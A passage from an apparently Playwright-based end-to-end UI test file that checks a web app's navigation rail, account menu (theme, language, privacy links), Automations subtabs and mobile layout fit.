    check('pilotage: the rail space switch opens the space menu',
      (await page.$$('#rail-space-menu .space-item[data-id]')).length >= 1);
    await page.click('#rail-space-btn'); // toggle the menu shut again (its anchor sits above the open menu)
    await page.waitForSelector('#rail-space-menu', { state: 'hidden', timeout: 4000 });
    // 1.5.0: the rail is eight entries with Pilotage last; the work surfaces that moved to the account chip
    // (Settings, Privacy, Memory, Activity) and the "⋯ More" menu (Automations, Activity) are no longer rail entries
    check('rail: Pilotage is the last rail entry', await page.$eval('.rail a:last-of-type', a => a.dataset.view) === 'pilotage');
    check('rail: the library entry is labelled Files', (await page.textContent('.rail a[data-view=library]')).includes('Files'));
    check('rail: Settings, Privacy, Memory, Activity and Automations left the rail',
      (await page.$$('.rail > a[data-view=settings], .rail > a[data-view=privacy], .rail > a[data-view=memory], .rail > a[data-view=activity], .rail > a[data-view=tasks], .rail > a[data-view=jobs]')).length === 0);
    // slice 6: Routines and Background jobs are one entry ("Automations") with [Scheduled · Background] subtabs, now in the More menu
    await page.click('#more-btn');
    await page.waitForSelector('#more-sheet:not([hidden])', { timeout: 4000 });
    check('automations: the More menu holds a single Automations entry', (await page.$$('#more-sheet a[data-view=tasks]')).length === 1
      && (await page.$$('#more-sheet a[data-view=jobs]')).length === 0);
    check('more: the desktop More menu also holds Activity', (await page.$$('#more-sheet a[data-view=activity]')).length === 1);
    await page.click('#more-sheet a[data-view=tasks]');
    await page.waitForSelector('#view-tasks:not([hidden])', { timeout: 4000 });
    check('automations: the Scheduled board shows with its subtab lit and the More entry lit',
      await page.isVisible('#view-tasks .subtabs a[data-view=tasks].active')
      && await page.isVisible('#more-btn.active'));
    await page.click('#view-tasks .subtabs a[data-view=jobs]');
    await page.waitForSelector('#view-jobs:not([hidden])', { timeout: 4000 });
    check('automations: the Background subtab switches to the jobs board, More entry still lit',
      await page.isVisible('#view-jobs .subtabs a[data-view=jobs].active')
      && await page.isVisible('#more-btn.active'));
  },
  async account({ page, check }) {
    await go(page, 'chat');
    check('account: a Claude-style account chip sits at the bottom-left of the rail', await page.isVisible('#account-btn .account-name'));
    check('account: the chip shows the signed-in identity, not a placeholder',
      (await page.textContent('#account-av')).trim() !== '?' && (await page.textContent('#account-name')).trim().length > 0);
    await page.click('#account-btn');
    await page.waitForSelector('#account-menu:not([hidden]) .space-item', { timeout: 4000 });
    const menuGeom = await page.evaluate(() => {
      const m = document.querySelector('#account-menu'), b = document.querySelector('#account-btn');
      const mr = m.getBoundingClientRect(), br = b.getBoundingClientRect();
      return { h: mr.height, w: mr.width, bottom: mr.bottom, chipTop: br.top, vh: innerHeight, left: mr.left };
    });
    check('account: the menu opens upward above the chip, fully on-screen (not crushed below it)',
      menuGeom.h > 120 && menuGeom.w > 120 && menuGeom.bottom <= menuGeom.chipTop + 1
      && menuGeom.bottom <= menuGeom.vh && menuGeom.left >= 0);
    const items = await page.textContent('#account-menu');
    check('account: the menu holds the account-level settings',
      /Settings|Réglages/.test(items) && /Usage|Utilisation/.test(items)
      && /Privacy|Confidentialité/.test(items) && /Sign out|déconnecter/.test(items));
    check('account: the Claude-only entries (plans, guest passes, API keys) are left out',
      !/forfaits|passes invités|clés d.API|API keys|guest passes/i.test(items));
    const beforeTheme = await page.getAttribute('html', 'data-theme');
    await page.click('#account-menu [data-act=theme]');
    await page.waitForSelector('#account-menu:not([hidden]) [data-act=theme]', { timeout: 2000 });
    check('account: the Theme row cycles the theme in place, menu staying open',
      (await page.getAttribute('html', 'data-theme')) !== beforeTheme);
    await page.click('#account-menu [data-sub=lang]');
    await page.waitForSelector('#account-menu [data-lang]', { timeout: 2000 });
    check('account: Language opens a sub-panel with the three choices (no reload until one is chosen)',
      (await page.$$('#account-menu [data-lang]')).length === 3);
    await page.click('#account-menu [data-back]');
    await page.waitForSelector('#account-menu [data-act=theme]', { timeout: 2000 });
    check('account: Back returns from the language sub-panel to the main menu', await page.isVisible('#account-menu [data-sub=lang]'));
    await page.click('#account-menu [data-go=privacy]');
    await page.waitForSelector('#account-menu', { state: 'hidden', timeout: 4000 });
    check('account: a menu entry navigates (Confidentialité → Privacy) and closes the menu',
      (await page.evaluate(() => location.hash)) === '#privacy');
    await page.evaluate(() => { try { saveTheme({ ...themePref(), mode: '' }); } catch {} }); // leave the theme as later flows expect
  },
  async mobile({ page, check }) {
    await page.setViewportSize({ width: 400, height: 800 });
    for (const v of ['chat', 'pilotage', 'library', 'board', 'settings']) {
      await go(page, v);
      check(`mobile: ${v} fits the screen`, await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth + 1));
    }
    // the Pilotage tab row must keep its height on mobile (it's a flex child of the scrolling column; overflow-x:auto must not let it collapse to 0)
    await go(page, 'pilotage');
    check('mobile: the Pilotage tabs stay visible (all four, row not collapsed)',
      await page.evaluate(() => document.querySelector('.pilot-tabs').getBoundingClientRect().height > 20
        && [...document.querySelectorAll('.ptab')].every(b => b.getBoundingClientRect().height > 20))
      && (await page.$$('.pilot-tabs .ptab')).length === 4);
    await page.click('#view-pilotage .ptab[data-ptab=roles]');
    await page.waitForSelector('.pilot-panel[data-ppanel=roles]:not([hidden])', { timeout: 4000 });
    check('mobile: tapping a Pilotage tab switches panels', await page.isHidden('.pilot-panel[data-ppanel=agents]'));
    // the account chip is hidden on mobile, so the "⋯ More" menu is the only path to Settings/Privacy/Sign out — it must stay on-screen
    await go(page, 'chat');
    await page.click('#more-btn');
    await page.waitForSelector('#more-sheet:not([hidden])', { timeout: 4000 });
    const moreGeom = await page.evaluate(() => {
      const m = document.querySelector('#more-sheet'); const r = m.getBoundingClientRect();
      return { left: r.left, right: r.right, top: r.top, bottom: r.bottom, w: r.width, h: r.height, vw: innerWidth, vh: innerHeight };
    });
    check('mobile: the More menu flies up fully on-screen (not pushed off the right edge)',
      moreGeom.w > 120 && moreGeom.h > 120 && moreGeom.left >= 0 && moreGeom.right <= moreGeom.vw + 1
      && moreGeom.top >= 0 && moreGeom.bottom <= moreGeom.vh + 1);
    check('mobile: the More menu reaches the account surfaces (Settings, Privacy, Sign out)', await page.evaluate(() => {
      const t = document.querySelector('#more-sheet').textContent;
      return /Settings|Réglages/.test(t) && /Privacy|Confidentialité/.test(t) && /Sign out|déconnecter/i.test(t);
    }));
    await page.setViewportSize({ width: 1280, height: 860 });
  },
};

export default async ctx => {
  ctx.page.setDefaultTimeout(5000);
  for (const [name, f] of Object.entries(flows)) {
    await ctx.page.evaluate(() => document.querySelectorAll('dialog[open]').forEach(d => d.close()));
    try { await f(ctx); } catch (e) { ctx.check(`${name}: ${e.message.split('\n').slice(0, 9).join(' | ')}`, false); }
  }
};
